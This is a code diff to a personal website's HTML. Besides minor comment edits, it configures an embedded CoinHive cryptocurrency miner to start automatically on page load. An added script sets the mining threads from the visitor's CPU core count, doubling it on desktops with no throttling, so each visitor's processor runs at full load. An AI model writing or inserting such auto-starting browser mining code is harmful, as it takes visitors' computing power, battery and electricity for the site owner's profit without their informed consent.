@@ -109,7 +109,7 @@
 						 placeholder="(testing)"></textarea>
 				</div>
 				<div>
-				<table class="hard-to-see">
+				<table class="hard-to-see"> <!-- TODO don't use tables for layouts -->
 				<tr>
 					<td>Filename to Save As:</td>
 					<td><input id="inputFileNameToSaveAs"></td>
@@ -159,8 +159,10 @@
 
 		<!-- Seva -->
 		<div id="seva">
+			<!-- TODO offer tutoring -->
+
 			<!-- TODO donated FOSS (i.e., GitHub Stats) -->
-			
+
 			<!-- BoincStats -->
 			<a target="_blank" href="https://boincstats.com/en/page/profile/user/114433">
 			<img src="https://boincstats.com/signature/-1/user/2354783/sig.png"
@@ -178,16 +180,33 @@
 		<aside class="rightcolumn">
 
 		<!-- CoinHive Miner -->
-		<div class="coinhive-miner"
+		<!-- data-threads="1"
+			 data-throttle="0.7" -->
+		<!-- data-threads="2"
+			 data-throttle="0.3" -->
+		<div id="coinhive" class="coinhive-miner"
 			 style="width: 256px; height: 310px"
 			 data-key="Ansnx3ssG1KPPjbVHMIikQP9APAZYIio"
 			 data-autostart="true"
+			 data-threads="4"
+			 data-throttle="0.1"
 			 data-background="#000000"
 			 data-text="#eeeeee"
 			 data-action="#00ff00"
 			 data-graph="#555555">
 		<em>Loading...</em>
 		</div>
+		<script>
+		var d = document.getElementById('coinhive');
+		var p = navigator.hardwareConcurrency || 4;
+		if (/Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
+			d.setAttribute('data-threads', p);
+			d.setAttribute('data-throttle', 0.3);
+		} else {
+			d.setAttribute('data-threads', p * 2);
+			d.setAttribute('data-throttle', 0.0);
+		}
+		</script>
 
 		<!-- Genesis Mining Affiliate -->
 		<div class="genesis-mining">
